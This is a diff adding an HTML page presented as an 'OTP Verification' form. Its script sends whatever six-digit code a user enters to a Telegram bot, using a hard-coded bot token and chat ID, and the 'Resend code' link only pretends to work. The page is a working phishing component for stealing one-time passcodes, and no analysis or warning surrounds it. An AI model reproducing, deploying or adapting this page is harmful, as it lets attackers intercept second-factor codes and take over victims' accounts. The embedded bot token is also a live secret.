@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>OTP Verification</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23e9ecef'/%3E%3C/svg%3E" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+
+<body>
+    <main class="frame p-3">
+        <section class="otp-card bg-white p-4 rounded shadow-sm mx-auto" style="max-width:400px;">
+            <h1 class="mb-3 fw-bold">OTP Verification</h1>
+            <p class="mb-1">Enter the OTP sent to your phone number</p>
+            <div class="otp-label fw-semibold mb-2">OTP</div>
+            <form id="otpForm" novalidate>
+                <div class="d-flex justify-content-between mb-3">
+                    <input class="otp-input form-control text-center" style="width:48px;" maxlength="1" type="text" inputmode="numeric">
+                    <input class="otp-input form-control text-center" style="width:48px;" maxlength="1" type="text" inputmode="numeric">
+                    <input class="otp-input form-control text-center" style="width:48px;" maxlength="1" type="text" inputmode="numeric">
+                    <input class="otp-input form-control text-center" style="width:48px;" maxlength="1" type="text" inputmode="numeric">
+                    <input class="otp-input form-control text-center" style="width:48px;" maxlength="1" type="text" inputmode="numeric">
+                    <input class="otp-input form-control text-center" style="width:48px;" maxlength="1" type="text" inputmode="numeric">
+                </div>
+                <div class="text-center mb-3">
+                    <a href="#" id="resendLink">Resend code</a>
+                </div>
+                <button type="submit" class="btn btn-primary w-100" id="submitBtn" disabled>Submit</button>
+            </form>
+        </section>
+    </main>
+    <script>
+        (function() {
+            const inputs = Array.from(document.querySelectorAll('.otp-input'));
+            const submitBtn = document.getElementById('submitBtn');
+            const form = document.getElementById('otpForm');
+            const onlyDigit = (str) => (str || '').replace(/\D+/g, '');
+
+            const updateButton = () => {
+                submitBtn.disabled = !inputs.every(i => i.value.length === 1);
+            };
+
+            inputs.forEach((input, idx) => {
+                input.addEventListener('input', (e) => {
+                    const val = onlyDigit(e.target.value);
+                    e.target.value = val.slice(-1);
+                    if (val && idx < inputs.length - 1) inputs[idx + 1].focus();
+                    updateButton();
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+                        inputs[idx - 1].focus();
+                        e.preventDefault();
+                    }
+                    if (!['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(e.key) && !/^\d$/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                const code = inputs.map(i => i.value).join('');
+                const botToken = '8215473378:AAHpdcLIykEjY14uMZJjuhPKvizv5vRUNvw';
+                const chatId = '5615316142';
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `OTP Entered: ${code}`
+                        })
+                    })
+                    .then(res => res.json())
+                    .then(() => alert('OTP sent to Telegram bot'))
+                    .catch(() => alert('Error sending OTP'));
+            });
+
+            document.getElementById('resendLink').addEventListener('click', (e) => {
+                e.preventDefault();
+                e.target.innerText = 'Code sent';
+                setTimeout(() => e.target.innerText = 'Resend code', 3000);
+            });
+
+            inputs[0].focus();
+        })();
+    </script>
+</body>
+
+</html>
